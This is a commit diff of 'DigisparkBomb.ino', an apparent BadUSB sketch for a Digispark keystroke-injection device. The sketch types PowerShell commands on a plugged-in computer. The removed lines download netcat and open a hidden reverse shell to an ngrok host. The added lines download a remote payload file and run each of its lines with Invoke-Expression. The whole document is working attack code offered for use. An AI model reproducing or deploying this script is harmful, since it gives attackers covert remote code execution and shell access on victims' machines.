90a4b1a213757e443b2440ba4c0cb25e623455e0
rmmenezes <ra29fa@gmail.com>
2022-11-14 09:57:24 -0300

    .

--- DigisparkBomb.ino
+++ DigisparkBomb.ino
@@ -1,4 +1,3 @@
-
 #include <stdlib.h>
 #include "DigiKeyboard.h"
 
@@ -13,14 +12,17 @@ void setup() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/payloads/netcat.exe?raw=true -o C:\\Windows\\Temp\\nc.exe;");
+  
+  DigiKeyboard.print("Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/payload.txt?raw=true -o C:\\Windows\\Temp\\payload.txt");
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
-  DigiKeyboard.delay(1000);
-  //a porta da utilizada para a reverse shell muda cada vez que inicia o ngrok
-  //podemos usar o (https://www.noip.com/pt-BR) para solucionar isso ;)
-  DigiKeyboard.print("Start-Process 'C:\\Windows\\Temp\\nc.exe' -ArgumentList '-e powershell.exe','0.tcp.sa.ngrok.io ','16392' -WindowStyle Hidden");
+  DigiKeyboard.delay(1000); 
+  DigiKeyboard.print("$file = Get-Content C:\\Windows\\Temp\\payload.txt");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
+  DigiKeyboard.print("ForEach ($line in $file){Invoke-Expression $line}");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);  
+  
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
